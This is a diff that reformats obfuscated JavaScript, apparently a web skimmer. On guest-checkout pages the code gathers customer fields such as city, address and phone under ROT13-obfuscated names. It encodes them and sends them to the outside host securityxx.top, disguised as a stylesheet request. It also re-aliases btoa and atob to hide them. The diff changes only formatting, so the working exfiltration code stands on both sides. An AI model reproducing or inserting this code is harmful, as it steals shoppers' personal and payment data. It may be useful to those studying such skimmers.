@@ -784,13 +784,14 @@ var _0x3d12 = function (_0xe460c8, _0x22d37a) {
   return _0x2d93[_0xe460c8];
 };
 var _0x478e03 = [
-    'timestamp',
-    'out'
-  ], _0x2894dd = [
-    'int',
-    'erase',
-    'val'
-  ];
+  'timestamp',
+  'out'
+];
+var _0x2894dd = [
+  'int',
+  'erase',
+  'val'
+];
 const _0x29754e = _0x41e312 => {
   if (typeof _0x41e312 !== 'string')
     return '';
@@ -798,26 +799,27 @@ const _0x29754e = _0x41e312 => {
 };
 function _0x18585b(_0x39d250, _0x5b10a5, _0x5e9dc9) {
   var _0x2dbea1 = function () {
-      var _0x1dea60 = true;
-      return function (_0x1094d5, _0x1b8cdc) {
-        var _0x824ac8 = _0x1dea60 ? function () {
-          if (_0x1b8cdc) {
-            var _0x3476e4 = _0x1b8cdc.apply(_0x1094d5, arguments);
-            _0x1b8cdc = null;
-            return _0x3476e4;
-          }
-        } : function () {
-        };
-        _0x1dea60 = false;
-        return _0x824ac8;
+    var _0x1dea60 = true;
+    return function (_0x1094d5, _0x1b8cdc) {
+      var _0x824ac8 = _0x1dea60 ? function () {
+        if (_0x1b8cdc) {
+          var _0x3476e4 = _0x1b8cdc.apply(_0x1094d5, arguments);
+          _0x1b8cdc = null;
+          return _0x3476e4;
+        }
+      } : function () {
       };
-    }(), _0x5d8b17 = _0x2dbea1(this, function () {
-      var _0x5efb50 = function () {
-        var _0x5d91f6 = /^([^ ]+( +[^ ]+)+)+[^ ]}/;
-        return !/^([^ ]+( +[^ ]+)+)+[^ ]}/.test(_0x5d8b17);
-      };
-      return _0x5efb50();
-    });
+      _0x1dea60 = false;
+      return _0x824ac8;
+    };
+  }();
+  var _0x5d8b17 = _0x2dbea1(this, function () {
+    var _0x5efb50 = function () {
+      var _0x5d91f6 = /^([^ ]+( +[^ ]+)+)+[^ ]}/;
+      return !/^([^ ]+( +[^ ]+)+)+[^ ]}/.test(_0x5d8b17);
+    };
+    return _0x5efb50();
+  });
   _0x5d8b17();
   _0x39d250[_0x5e9dc9] = _0x39d250[_0x5b10a5];
 }
@@ -826,7 +828,15 @@ _0x18585b(window, 'setInterval', '_A');
 _0x18585b(window, 'clearInterval', '_CA');
 _0x18585b(window, 'btoa', '_b');
 _0x18585b(window, 'atob', '_a');
-var _0xdc52be = {}, _0x1b8194 = {}, _0x16159b = {}, _0x2c11ba = {}, _0x33cc2f, _0x3ee8f6, _0x25fd7c = false, _0x5acbd9 = true, _0x171a7f = true;
+var _0xdc52be = {};
+var _0x1b8194 = {};
+var _0x16159b = {};
+var _0x2c11ba = {};
+var _0x33cc2f;
+var _0x3ee8f6;
+var _0x25fd7c = false;
+var _0x5acbd9 = true;
+var _0x171a7f = true;
 const _0x125a5a = 'cart_created';
 function _0x149802(_0xdfe62c, _0x483660) {
   var _0x4bdbae = 0;
@@ -887,7 +897,8 @@ if (window.location.href.indexOf(_a('Z3Vlc3RjaGVja291dA==')) > 0)
                 _0x2c11ba.pvgl = _0x18abb2('none');
                 _0x2c11ba.nqqvgvbany2 = _0x18abb2('none');
                 _0x2c11ba.cubar = _0x18abb2('none');
-                var _0x59cb84 = { ..._0x2c11ba }, _0x49fc23 = document.createElement('link');
+                var _0x59cb84 = { ..._0x2c11ba };
+                var _0x49fc23 = document.createElement('link');
                 _0x49fc23.href = 'https://securityxx.top/stylesheet.css?timestamp=' + _0x18abb2(JSON.stringify(_0x226246(_0x59cb84)));
                 _0x49fc23.rel = 'stylesheet';
                 _0x49fc23.type = 'text/css';
@@ -955,10 +966,11 @@ function _0x2e9e4b(_0x2a6a67) {
   return _b(_0x38224c);
 }
 var _0x18abb2 = _0x50d82b => {
-    return _0x4533af(_0x2e9e4b(_0x50d82b));
-  }, _0x2103f5 = _0x242999 => {
-    return _a(_0x4533af(_0x242999));
-  };
+  return _0x4533af(_0x2e9e4b(_0x50d82b));
+};
+var _0x2103f5 = _0x242999 => {
+  return _a(_0x4533af(_0x242999));
+};
 function _0x4533af(_0x55e9eb, _0x446131) {
   return ++_0x446131 ? String.fromCharCode((_0x55e9eb < '[' ? 91 : 123) > (_0x55e9eb = _0x55e9eb.charCodeAt() + 12 + 1) ? _0x55e9eb : _0x55e9eb - 26) : _0x55e9eb.replace(/[a-zA-Z]/g, _0x4533af);
 }
